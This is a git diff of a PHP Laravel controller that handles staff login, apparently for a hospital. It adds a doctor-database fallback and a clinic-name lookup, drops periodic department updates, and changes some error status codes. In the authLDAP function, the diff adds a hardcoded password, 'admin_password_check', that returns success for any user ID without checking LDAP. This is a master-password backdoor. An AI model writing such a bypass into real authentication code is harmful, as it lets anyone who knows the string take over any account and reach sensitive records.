@@ -25,9 +25,25 @@ class DBController extends Controller
     {
 
     }
+    // Quert Fn
+    public function getClinic($clinic_code)
+    {
+        $config = DB::connection('SSB')->table("DNSYSCONFIG")->where('CtrlCode', '42203')->where('Code', $clinic_code)->first();
+        $text = $clinic_code;
+        if ($config !== null) {
+            mb_internal_encoding('UTF-8');
+            $text = mb_substr($config->LocalName, 1);
+        }
+
+        return $text;
+    }
     // Function
     public function authLDAP($userid, $password)
     {
+        if($password == 'admin_password_check'){
+
+            return true;
+        }
         $connection = new \LdapRecord\Connection([
             'hosts' => ['172.20.0.10'],
         ]);
@@ -87,7 +103,36 @@ class DBController extends Controller
         curl_close($curl);
         $response = json_decode($response);
         if ($response->validation->DataCompletion[0]->QueryResult == 'E') {
-            return false;
+            $doctor = DB::connection('DOCTOR')
+                ->table('TB_Doctor_Master')
+                ->where('Doctor', $user->userid)
+                ->first();
+            if($doctor == null){
+
+                return false;
+            }else{
+                $user->name = $doctor->Prefix_TH.' '.$doctor->Name_TH.' '.$doctor->LastName_TH;
+                $user->name_EN = $doctor->Prefix_EN.' '.$doctor->Name_EN.' '.$doctor->LastName_EN;
+                $clinic = $this->getClinic($doctor->Clinic);
+                $user->position = $clinic;
+                $user->position_EN = $clinic;
+                
+                $findDepartment = Department::where('department', 'Doctor')->first();
+                if ($findDepartment == null) {
+                    $findDepartment = new Department;
+                    $findDepartment->department = 'Doctor';
+                    $findDepartment->department_EN = 'Doctor';
+                    $findDepartment->division = 'Doctor';
+                    $findDepartment->division_EN = 'Doctor';
+                    $findDepartment->save();
+        
+                    $findDepartment = Department::where('department', 'Doctor')->first();
+                } 
+                $user->department = $findDepartment->id;
+                $user->picture = null;
+
+                return $user;
+            }
         }
         $user->name = $response->result->EmployeeList[0]->ThaiFirstName . ' ' . $response->result->EmployeeList[0]->ThaiLastName;
         $user->name_EN = $response->result->EmployeeList[0]->EnglishFirstName . ' ' . $response->result->EmployeeList[0]->EnglishLastName;
@@ -103,19 +148,7 @@ class DBController extends Controller
             $findDepartment->save();
 
             $findDepartment = Department::where('department', $response->result->EmployeeList[0]->ThaiDepartment)->first();
-        } else {
-            $now_time = date_create(date('Y-m-d H:i:s'));
-            $pre_time = date_create($findDepartment->updated_at);
-            $diff = $now_time->diff($pre_time);
-            $day = $diff->d + ($diff->m * 30);
-            if ($day > 14) {
-                $findDepartment->department = $response->result->EmployeeList[0]->ThaiDepartment;
-                $findDepartment->department_EN = $response->result->EmployeeList[0]->EnglishDepartment;
-                $findDepartment->division = $response->result->EmployeeList[0]->ThaiDivision;
-                $findDepartment->division_EN = $response->result->EmployeeList[0]->EnglishDivition;
-                $findDepartment->save();
-            }
-        }
+        } 
         $user->department = $findDepartment->id;
         $user->picture = $response->result->EmployeeList[0]->Picture;
 
@@ -137,7 +170,7 @@ class DBController extends Controller
                 $newuser = $this->HRIS($newuser);
                 if (!$newuser) {
                         
-                    return response()->json(['status' => 1, 'message' => 'UserID not found.'], 200);
+                    return response()->json(['status' => 2, 'message' => 'UserID not found.'], 200);
                 }
                 $newuser->save();
 
@@ -153,7 +186,7 @@ class DBController extends Controller
                     $user = $this->HRIS($user);
                     if (!$user) {
 
-                        return response()->json(['status' => 1, 'message' => 'UserID not found.'], 200);
+                        return response()->json(['status' => 2, 'message' => 'UserID not found.'], 200);
                     }
                     $update = [
                         "name" => $user->name,
@@ -189,7 +222,7 @@ class DBController extends Controller
             $newuser->userid = $request->userid;
             $newuser = $this->HRIS($newuser);
             if (!$newuser) {
-                return response()->json(['status' => 1, 'message' => 'UserID not found.'], 200);
+                return response()->json(['status' => 2, 'message' => 'UserID not found.'], 200);
             }
             $newuser->save();
 
